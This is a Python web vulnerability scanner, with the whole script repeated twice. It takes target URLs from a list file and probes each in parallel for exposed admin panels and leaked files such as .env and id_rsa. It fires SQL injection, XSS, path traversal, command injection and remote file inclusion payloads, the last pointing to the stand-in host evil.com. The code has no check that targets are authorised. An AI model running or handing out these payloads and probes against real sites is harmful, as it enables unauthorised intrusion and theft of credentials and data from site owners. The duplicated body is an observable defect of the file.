import requests
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, urlunparse
import threading
from queue import Queue
import time

# Ignore SSL warnings (optional)
requests.packages.urllib3.disable_warnings()

NUM_THREADS = 5

# Common admin panel paths to check
COMMON_ADMIN_PATHS = [
    "/admin",
    "/administrator",
    "/admin/login",
    "/admin.php",
    "/login",
    "/admin/login.php",
    "/admin_area/",
    "/cpanel",
]

# Sensitive files often leaked on servers
SENSITIVE_FILES = [
    "backup.zip",
    "backup.tar.gz",
    ".git/config",
    ".env",
    "config.php",
    "config.inc.php",
    "database.sql",
    "dump.sql",
    "id_rsa",
]

# Payloads for different vulnerability checks
SQLI_PAYLOADS = [
    "' OR '1'='1",
    "\" OR \"1\"=\"1",
    "' OR '1'='1' -- ",
]
XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "\"><script>alert(1)</script>",
    "'><svg/onload=alert(1)>",
]
LFI_PAYLOADS = [
    "../../../../../../etc/passwd",
    "../../../../../../boot.ini",
]
RFI_PAYLOADS = [
    "http://evil.com/shell.txt",
]
CMDI_PAYLOADS = [
    "test; uname -a",
    "test && whoami",
]

print_lock = threading.Lock()

def safe_print(*args, **kwargs):
    """Thread-safe print."""
    with print_lock:
        print(*args, **kwargs)

def check_url(url):
    try:
        resp = requests.get(url, timeout=10, verify=False)
        return resp.status_code, resp.text
    except Exception:
        return None, None

def test_common_admin_paths(base_url):
    findings = []
    for path in COMMON_ADMIN_PATHS:
        url = urljoin(base_url, path)
        status, _ = check_url(url)
        if status and status < 400:
            findings.append({
                "url": url,
                "issue": "Admin page found",
                "explanation": f"Admin panel found at '{path}'. Possible weak authentication."
            })
    return findings

def test_sensitive_files(base_url):
    findings = []
    for filename in SENSITIVE_FILES:
        url = urljoin(base_url, filename)
        status, _ = check_url(url)
        if status == 200:
            findings.append({
                "url": url,
                "issue": "Sensitive file exposed",
                "explanation": f"Sensitive file '{filename}' accessible. Possible data leakage."
            })
    return findings

def test_directory_listing(url):
    status, content = check_url(url)
    if status == 200 and content:
        if "Index of /" in content or "Parent Directory" in content:
            return [{
                "url": url,
                "issue": "Directory Listing Enabled",
                "explanation": "Web server allows directory listing, exposing file structures."
            }]
    return []

def test_sql_injection(url):
    findings = []
    parsed = urlparse(url)
    params = parse_qs(parsed.query)

    # Test on parameters
    for param in params:
        for payload in SQLI_PAYLOADS:
            test_params = params.copy()
            test_params[param] = payload
            test_query = urlencode(test_params, doseq=True)
            test_url = urlunparse(parsed._replace(query=test_query))
            status, content = check_url(test_url)
            if status and (status >= 500 or any(err in (content or "").lower() for err in ["sql", "syntax", "error"])):
                findings.append({
                    "url": test_url,
                    "issue": "SQL Injection Detected",
                    "explanation": f"Injected payload '{payload}' in param '{param}' caused a potential SQL error."
                })

    # Test on path
    for payload in SQLI_PAYLOADS:
        test_path = url.rstrip('/') + f"/{payload}"
        status, content = check_url(test_path)
        if status and (status >= 500 or any(err in (content or "").lower() for err in ["sql", "syntax", "error"])):
            findings.append({
                "url": test_path,
                "issue": "SQL Injection Detected in Path",
                "explanation": f"Injected payload '{payload}' in path caused a potential SQL error."
            })

    return findings

def test_xss(url):
    findings = []
    parsed = urlparse(url)
    params = parse_qs(parsed.query)

    # Test on parameters
    for param in params:
        for payload in XSS_PAYLOADS:
            test_params = params.copy()
            test_params[param] = payload
            test_query = urlencode(test_params, doseq=True)
            test_url = urlunparse(parsed._replace(query=test_query))
            status, content = check_url(test_url)
            if status and payload in (content or ""):
                findings.append({
                    "url": test_url,
                    "issue": "XSS Vulnerability",
                    "explanation": f"Payload '{payload}' reflected in response for param '{param}'."
                })

    # Test on path
    for payload in XSS_PAYLOADS:
        test_path = url.rstrip('/') + f"/{payload}"
        status, content = check_url(test_path)
        if status and payload in (content or ""):
            findings.append({
                "url": test_path,
                "issue": "XSS Vulnerability in Path",
                "explanation": f"Payload '{payload}' reflected in response from path."
            })

    return findings

def test_lfi(url):
    findings = []
    for payload in LFI_PAYLOADS:
        test_path = url.rstrip('/') + f"/{payload}"
        status, content = check_url(test_path)
        if status == 200 and any(term in (content or "") for term in ["root:", "[boot loader]", "[operating systems]"]):
            findings.append({
                "url": test_path,
                "issue": "LFI Detected",
                "explanation": f"LFI payload '{payload}' revealed sensitive file content."
            })
    return findings

def test_rfi(url):
    findings = []
    for payload in RFI_PAYLOADS:
        test_path = url.rstrip('/') + f"/{payload}"
        status, content = check_url(test_path)
        if status == 200 and "shell" in (content or "").lower():
            findings.append({
                "url": test_path,
                "issue": "RFI Detected",
                "explanation": f"RFI payload '{payload}' may have included remote content."
            })
    return findings

def test_cmdi(url):
    findings = []
    for payload in CMDI_PAYLOADS:
        test_path = url.rstrip('/') + f"/{payload}"
        status, content = check_url(test_path)
        if status == 200 and any(term in (content or "").lower() for term in ["uid=", "gid=", "root", "admin"]):
            findings.append({
                "url": test_path,
                "issue": "Command Injection Detected",
                "explanation": f"CMDI payload '{payload}' may have executed a system command."
            })
    return findings

def test_login_page(url):
    findings = []
    status, content = check_url(url)
    if status and content:
        if "<form" in content.lower() and any(kw in content.lower() for kw in ["login", "password", "username", "sign in"]):
            findings.append({
                "url": url,
                "issue": "Login Page Found",
                "explanation": "Login form detected. Could be tested for weak credentials."
            })
    return findings

def scan_url(url):
    safe_print(f"\n[*] Scanning URL: {url}")
    all_findings = []

    if check_url(url)[0]:
        all_findings.extend(test_common_admin_paths(url))
        all_findings.extend(test_sensitive_files(url))
        all_findings.extend(test_directory_listing(url))
        all_findings.extend(test_sql_injection(url))
        all_findings.extend(test_xss(url))
        all_findings.extend(test_lfi(url))
        all_findings.extend(test_rfi(url))
        all_findings.extend(test_cmdi(url))
        all_findings.extend(test_login_page(url))

    if all_findings:
        safe_print(f"[!] Vulnerabilities found for {url}:")
        for f in all_findings:
            safe_print(f"  - Issue: {f['issue']}\n    URL: {f['url']}\n    Detail: {f['explanation']}\n")
    else:
        safe_print(f"[+] No issues found for {url}.")
    return all_findings

def worker(q, results):
    while True:
        url = q.get()
        if url is None:
            break
        findings = scan_url(url)
        results.extend(findings)
        q.task_done()

def main():
    input_file = "admin.txt"
    try:
        with open(input_file) as f:
            urls = [line.strip() for line in f if line.strip()]
    except Exception as e:
        print(f"[!] Error reading {input_file}: {e}")
        return

    q = Queue()
    results = []
    for url in urls:
        q.put(url)

    threads = []
    for _ in range(NUM_THREADS):
        t = threading.Thread(target=worker, args=(q, results))
        t.start()
        threads.append(t)

    q.join()
    for _ in range(NUM_THREADS):
        q.put(None)
    for t in threads:
        t.join()

    if results:
        with open("admin_vuln_report.txt", "w") as f:
            for res in results:
                f.write(f"Issue: {res['issue']}\nURL: {res['url']}\nDetail: {res['explanation']}\n{'='*60}\n")
        print(f"\n[+] Report saved to admin_vuln_report.txt")
    else:
        print("\n[+] No vulnerabilities found.")

if __name__ == "__main__":
    main()
import requests
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, urlunparse
import threading
from queue import Queue
import time

# Ignore SSL warnings (optional)
requests.packages.urllib3.disable_warnings()

NUM_THREADS = 5

# Common admin panel paths to check
COMMON_ADMIN_PATHS = [
    "/admin",
    "/administrator",
    "/admin/login",
    "/admin.php",
    "/login",
    "/admin/login.php",
    "/admin_area/",
    "/cpanel",
]

# Sensitive files often leaked on servers
SENSITIVE_FILES = [
    "backup.zip",
    "backup.tar.gz",
    ".git/config",
    ".env",
    "config.php",
    "config.inc.php",
    "database.sql",
    "dump.sql",
    "id_rsa",
]

# Payloads for different vulnerability checks
SQLI_PAYLOADS = [
    "' OR '1'='1",
    "\" OR \"1\"=\"1",
    "' OR '1'='1' -- ",
]
XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "\"><script>alert(1)</script>",
    "'><svg/onload=alert(1)>",
]
LFI_PAYLOADS = [
    "../../../../../../etc/passwd",
    "../../../../../../boot.ini",
]
RFI_PAYLOADS = [
    "http://evil.com/shell.txt",
]
CMDI_PAYLOADS = [
    "test; uname -a",
    "test && whoami",
]

print_lock = threading.Lock()

def safe_print(*args, **kwargs):
    """Thread-safe print."""
    with print_lock:
        print(*args, **kwargs)

def check_url(url):
    try:
        resp = requests.get(url, timeout=10, verify=False)
        return resp.status_code, resp.text
    except Exception:
        return None, None

def test_common_admin_paths(base_url):
    findings = []
    for path in COMMON_ADMIN_PATHS:
        url = urljoin(base_url, path)
        status, _ = check_url(url)
        if status and status < 400:
            findings.append({
                "url": url,
                "issue": "Admin page found",
                "explanation": f"Admin panel found at '{path}'. Possible weak authentication."
            })
    return findings

def test_sensitive_files(base_url):
    findings = []
    for filename in SENSITIVE_FILES:
        url = urljoin(base_url, filename)
        status, _ = check_url(url)
        if status == 200:
            findings.append({
                "url": url,
                "issue": "Sensitive file exposed",
                "explanation": f"Sensitive file '{filename}' accessible. Possible data leakage."
            })
    return findings

def test_directory_listing(url):
    status, content = check_url(url)
    if status == 200 and content:
        if "Index of /" in content or "Parent Directory" in content:
            return [{
                "url": url,
                "issue": "Directory Listing Enabled",
                "explanation": "Web server allows directory listing, exposing file structures."
            }]
    return []

def test_sql_injection(url):
    findings = []
    parsed = urlparse(url)
    params = parse_qs(parsed.query)

    # Test on parameters
    for param in params:
        for payload in SQLI_PAYLOADS:
            test_params = params.copy()
            test_params[param] = payload
            test_query = urlencode(test_params, doseq=True)
            test_url = urlunparse(parsed._replace(query=test_query))
            status, content = check_url(test_url)
            if status and (status >= 500 or any(err in (content or "").lower() for err in ["sql", "syntax", "error"])):
                findings.append({
                    "url": test_url,
                    "issue": "SQL Injection Detected",
                    "explanation": f"Injected payload '{payload}' in param '{param}' caused a potential SQL error."
                })

    # Test on path
    for payload in SQLI_PAYLOADS:
        test_path = url.rstrip('/') + f"/{payload}"
        status, content = check_url(test_path)
        if status and (status >= 500 or any(err in (content or "").lower() for err in ["sql", "syntax", "error"])):
            findings.append({
                "url": test_path,
                "issue": "SQL Injection Detected in Path",
                "explanation": f"Injected payload '{payload}' in path caused a potential SQL error."
            })

    return findings

def test_xss(url):
    findings = []
    parsed = urlparse(url)
    params = parse_qs(parsed.query)

    # Test on parameters
    for param in params:
        for payload in XSS_PAYLOADS:
            test_params = params.copy()
            test_params[param] = payload
            test_query = urlencode(test_params, doseq=True)
            test_url = urlunparse(parsed._replace(query=test_query))
            status, content = check_url(test_url)
            if status and payload in (content or ""):
                findings.append({
                    "url": test_url,
                    "issue": "XSS Vulnerability",
                    "explanation": f"Payload '{payload}' reflected in response for param '{param}'."
                })

    # Test on path
    for payload in XSS_PAYLOADS:
        test_path = url.rstrip('/') + f"/{payload}"
        status, content = check_url(test_path)
        if status and payload in (content or ""):
            findings.append({
                "url": test_path,
                "issue": "XSS Vulnerability in Path",
                "explanation": f"Payload '{payload}' reflected in response from path."
            })

    return findings

def test_lfi(url):
    findings = []
    for payload in LFI_PAYLOADS:
        test_path = url.rstrip('/') + f"/{payload}"
        status, content = check_url(test_path)
        if status == 200 and any(term in (content or "") for term in ["root:", "[boot loader]", "[operating systems]"]):
            findings.append({
                "url": test_path,
                "issue": "LFI Detected",
                "explanation": f"LFI payload '{payload}' revealed sensitive file content."
            })
    return findings

def test_rfi(url):
    findings = []
    for payload in RFI_PAYLOADS:
        test_path = url.rstrip('/') + f"/{payload}"
        status, content = check_url(test_path)
        if status == 200 and "shell" in (content or "").lower():
            findings.append({
                "url": test_path,
                "issue": "RFI Detected",
                "explanation": f"RFI payload '{payload}' may have included remote content."
            })
    return findings

def test_cmdi(url):
    findings = []
    for payload in CMDI_PAYLOADS:
        test_path = url.rstrip('/') + f"/{payload}"
        status, content = check_url(test_path)
        if status == 200 and any(term in (content or "").lower() for term in ["uid=", "gid=", "root", "admin"]):
            findings.append({
                "url": test_path,
                "issue": "Command Injection Detected",
                "explanation": f"CMDI payload '{payload}' may have executed a system command."
            })
    return findings

def test_login_page(url):
    findings = []
    status, content = check_url(url)
    if status and content:
        if "<form" in content.lower() and any(kw in content.lower() for kw in ["login", "password", "username", "sign in"]):
            findings.append({
                "url": url,
                "issue": "Login Page Found",
                "explanation": "Login form detected. Could be tested for weak credentials."
            })
    return findings

def scan_url(url):
    safe_print(f"\n[*] Scanning URL: {url}")
    all_findings = []

    if check_url(url)[0]:
        all_findings.extend(test_common_admin_paths(url))
        all_findings.extend(test_sensitive_files(url))
        all_findings.extend(test_directory_listing(url))
        all_findings.extend(test_sql_injection(url))
        all_findings.extend(test_xss(url))
        all_findings.extend(test_lfi(url))
        all_findings.extend(test_rfi(url))
        all_findings.extend(test_cmdi(url))
        all_findings.extend(test_login_page(url))

    if all_findings:
        safe_print(f"[!] Vulnerabilities found for {url}:")
        for f in all_findings:
            safe_print(f"  - Issue: {f['issue']}\n    URL: {f['url']}\n    Detail: {f['explanation']}\n")
    else:
        safe_print(f"[+] No issues found for {url}.")
    return all_findings

def worker(q, results):
    while True:
        url = q.get()
        if url is None:
            break
        findings = scan_url(url)
        results.extend(findings)
        q.task_done()

def main():
    input_file = "admin.txt"
    try:
        with open(input_file) as f:
            urls = [line.strip() for line in f if line.strip()]
    except Exception as e:
        print(f"[!] Error reading {input_file}: {e}")
        return

    q = Queue()
    results = []
    for url in urls:
        q.put(url)

    threads = []
    for _ in range(NUM_THREADS):
        t = threading.Thread(target=worker, args=(q, results))
        t.start()
        threads.append(t)

    q.join()
    for _ in range(NUM_THREADS):
        q.put(None)
    for t in threads:
        t.join()

    if results:
        with open("admin_vuln_report.txt", "w") as f:
            for res in results:
                f.write(f"Issue: {res['issue']}\nURL: {res['url']}\nDetail: {res['explanation']}\n{'='*60}\n")
        print(f"\n[+] Report saved to admin_vuln_report.txt")
    else:
        print("\n[+] No vulnerabilities found.")

if __name__ == "__main__":
    main()
